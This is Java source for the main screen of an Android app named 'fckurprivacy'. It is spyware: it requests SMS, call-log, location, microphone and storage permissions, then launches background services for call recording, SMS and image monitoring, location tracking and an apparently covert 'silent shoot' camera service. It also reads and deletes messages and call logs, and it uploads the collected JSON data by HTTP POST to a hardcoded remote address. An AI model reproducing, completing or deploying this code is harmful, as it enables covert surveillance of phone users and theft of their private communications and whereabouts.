package com.vergermiya.harevost.fckurprivacy;

import android.Manifest;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.vergermiya.harevost.fckurprivacy.CallLogger.CallLogger;
import com.vergermiya.harevost.fckurprivacy.CallLogger.CallLogsJson;
import com.vergermiya.harevost.fckurprivacy.CallRecorder.CallRecord;
import com.vergermiya.harevost.fckurprivacy.ImageChecker.ImageCheckService;
import com.vergermiya.harevost.fckurprivacy.ImageChecker.ImageContentObserver;
import com.vergermiya.harevost.fckurprivacy.InfoChecker.InfoChecker;
import com.vergermiya.harevost.fckurprivacy.InfoChecker.InfoJson;
import com.vergermiya.harevost.fckurprivacy.PermissionsChecker.PermissionsActivity;
import com.vergermiya.harevost.fckurprivacy.PermissionsChecker.PermissionsChecker;
import com.vergermiya.harevost.fckurprivacy.SilentShooter.SilentShootService;
import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsCheckService;
import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsJson;
import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsObserver;
import com.vergermiya.harevost.fckurprivacy.Util.AESUtils;
import com.vergermiya.harevost.fckurprivacy.Util.AccessibilityChecker;
import com.vergermiya.harevost.fckurprivacy.Util.FileSaver;
import com.vergermiya.harevost.fckurprivacy.Util.HttpRequest;
import com.vergermiya.harevost.fckurprivacy.Util.JsonBuilder;
import com.vergermiya.harevost.fckurprivacy.Util.JsonUploader;
import com.vergermiya.harevost.fckurprivacy.locationChecker.LocationService;

import org.json.JSONArray;

import java.io.File;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_CODE = 0; // 请求码

    private Button getInfoButton;
    private TextView gottenInfoText;
    private Button getCallLogsButton;
    private Button deleteCallLogsButton;
    private Button getSmsButton;
    private Button delSmsButton;
    private Button uploadJsonButton;

    // 所需的全部权限
    static final String[] PERMISSIONS = new String[]{
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.WRITE_CALL_LOG
    };

    private PermissionsChecker mPermissionsChecker; // 权限检测器

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        initView();
        mPermissionsChecker = new PermissionsChecker(this);
        initEvent();
    }

    private void initView() {
        getInfoButton = findViewById(R.id.getInfoButton);
        gottenInfoText = findViewById(R.id.gottenInfo);
        getCallLogsButton = findViewById(R.id.getCallLogsButton);
        deleteCallLogsButton = findViewById(R.id.deleteCallLogsButton);
        getSmsButton = findViewById(R.id.getSmsButton);
        delSmsButton = findViewById(R.id.delSmsButton);
        uploadJsonButton = findViewById(R.id.uploadJsonButton);
    }

    private void initEvent() {

        getInfoButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                InfoJson infoJson = InfoChecker.getPhoneInfo(getApplicationContext());
                String infoJsonStr = JsonBuilder.buildInfoJson(infoJson).toString();
                gottenInfoText.setText(infoJsonStr);
            }
        });

        CallRecord callRecord = new CallRecord.Builder(getApplicationContext())
                .setRecordFileName("CallRecorderTestFile")
                .setRecordDirName("Music/CallRecorderTest")
                .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                .setOutputFormat(MediaRecorder.OutputFormat.AMR_NB)
                .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                .setShowSeed(true)
                .build();
        callRecord.startCallRecordService();

        Intent smsIntent = new Intent();
        smsIntent.setClass(this, SmsCheckService.class);
        startService(smsIntent);

        Intent locService = new Intent(MainActivity.this, LocationService.class);
        startService(locService);

        Intent imageIntent = new Intent(MainActivity.this, ImageCheckService.class);
        startService(imageIntent);

        Intent lockIntent = new Intent(MainActivity.this, SilentShootService.class);
        startService(lockIntent);


        getCallLogsButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                CallLogsJson callLogsJson = CallLogger.getLatestCallLog(MainActivity.this);
                gottenInfoText.setText(callLogsJson.toString());
            }
        });

        deleteCallLogsButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                CallLogger.deleteLatestCallLog(MainActivity.this);
            }
        });

        getSmsButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                ArrayList<SmsJson> smsJsons = SmsObserver.querySmsJson(getApplicationContext(), SmsObserver.SMS_ALL);
                String smsJsonStr = JsonBuilder.buildSmsJsons(smsJsons).toString();
                gottenInfoText.setText(smsJsonStr);
            }
        });

        delSmsButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                SmsObserver.deleteLatestSms(getApplicationContext(), SmsObserver.SMS_SENT);
            }
        });

        uploadJsonButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Thread uploadThread = new Thread() {
                    @Override
                    public void run() {
                        File cryptoaFile = new FileSaver().getPublicStorageDir("cryptoa");
                        File[] files = cryptoaFile.listFiles();
                        File latestFile = files[0];
                        for (File file : files) {
                            if (file.lastModified() > latestFile.lastModified() && latestFile.getName().endsWith(".json")) {
                                latestFile = file;
                            }
                        }
                        //JsonUploader.postJson(smsJsonStr);
                        //HttpRequest.sendPost("http://10.8.205.87:8080", "allsms" + "=" + AESUtils.filetoStr(latestFile.getPath()));
                        HttpRequest.sendPost("http://10.8.187.120:8080", "name=" + latestFile.getName() + "&" +
                                                                        "value=" + AESUtils.filetoStr(latestFile.getPath()));
                    }
                };
                uploadThread.start();
            }
        });
    }


    @Override
    protected void onResume() {
        super.onResume();

        // 缺少权限时, 进入权限配置页面
        if (mPermissionsChecker.lacksPermissions(PERMISSIONS)) {
            startPermissionsActivity();
        }

        AccessibilityChecker.setAccessibilitySetting(MainActivity.this);
    }

    private void startPermissionsActivity() {
        PermissionsActivity.startActivityForResult(this, REQUEST_CODE, PERMISSIONS);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        // 拒绝时, 关闭页面, 缺少主要权限, 无法运行
        if (requestCode == REQUEST_CODE && resultCode == PermissionsActivity.PERMISSIONS_DENIED) {
            finish();
        }
        InfoChecker.saveInfoJson(this);

        JSONArray allImageInfo = JsonBuilder.buildImageJsons(ImageContentObserver.getPhotoLocation(this));
        FileSaver fileSaver = new FileSaver();
        fileSaver.saveFile("allImageInfo", ".json", allImageInfo.toString());
    }
}
